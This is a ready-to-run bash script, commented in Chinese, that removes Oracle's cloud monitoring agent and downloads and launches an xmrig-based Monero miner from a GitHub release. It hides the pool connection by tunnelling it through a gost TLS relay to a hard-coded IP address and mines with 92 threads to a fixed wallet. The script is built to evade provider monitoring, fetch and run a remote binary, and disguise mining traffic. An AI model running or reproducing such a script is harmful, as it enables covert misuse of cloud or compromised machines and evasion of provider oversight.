#!/bin/bash

# 移除 oracle-cloud-agent（如果已安装）
snap remove oracle-cloud-agent

# 安装 Snap 并通过 Snap 安装 gost
sudo snap install core
sudo snap install gost

# 更新 APT 并安装必要的软件包
apt update && apt install -y wget curl libhwloc-dev screen

# 下载并解压 xmrig0 挖矿程序
wget https://github.com/vavn1024/xmrig0/releases/download/xmrig0-6.22.2/xmrig0.tar.gz
tar -zxvf xmrig0.tar.gz
chmod +x xmrig0

# 启动 gost 作为后台服务进行端口转发
screen -dmS gost gost -L=tcp://:6666/pool.supportxmr.com:9000 -F=relay+tls://156.226.175.163:37555

# 启动 xmrig0 挖矿
screen -dmS xmrig ./xmrig0 -o 127.0.0.1:6666 -u 49KXisoYP8B5YcBtzqCsu3G1RjVM7pF75HVrpJVf6ihu5En4NciLX4x6Ts1kSfo7r2D1QRs5h29RtM3EXgABmZ2FBmqhoY1 -k -a rx/0 -t 92 --donate-level=N --tls --randomx-1gb-pages -p Abudhabi-6-paris

echo "所有服务已启动，可以使用 'screen -ls' 查看运行中的进程。"
